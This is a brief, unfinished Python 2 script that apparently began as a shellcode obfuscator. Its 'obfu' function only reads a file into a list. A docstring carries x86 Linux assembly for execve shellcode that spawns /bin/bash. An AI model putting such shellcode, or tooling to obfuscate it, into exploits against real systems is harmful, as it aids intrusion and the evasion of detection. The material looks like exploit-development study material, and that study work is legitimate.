#!/usr/bin/env python2
import re

in_array = []
out_array = []

def obfu(infile):
	offset_sz = 4
	offset = 0
	rev_offset = 0
	in_array = []
	out_array = []
	with open(infile, 'r') as F:
		for line in F:
			in_array.append(line)
	F.close()
	




"""
section .text
global _start
_start:

	xor eax, eax
	push eax
	mov ecx, [esp]
	mov edx, [esp]
	push 0x68736162 	;  hsab 
	push 0x2f6e6962 	;  /nib 
	push 0x2f2f2f2f 	;  ////	
	mov al, 0xb
	mov ebx, esp
	int 0x80

"""	
